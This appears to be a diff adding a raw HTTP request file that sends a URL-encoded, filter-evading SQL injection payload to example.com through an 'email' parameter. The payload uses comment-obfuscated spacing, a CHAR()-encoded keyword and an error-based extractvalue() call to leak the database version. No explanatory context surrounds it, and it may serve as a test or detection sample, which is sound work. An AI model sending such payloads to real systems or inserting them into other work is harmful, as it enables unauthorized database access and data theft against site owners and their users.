@@ -1,0 +1,6 @@
+GET /index.php?email=%27/%2A%2A/CHAR%2897%2C110%2C100%29/%2A%2A/extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
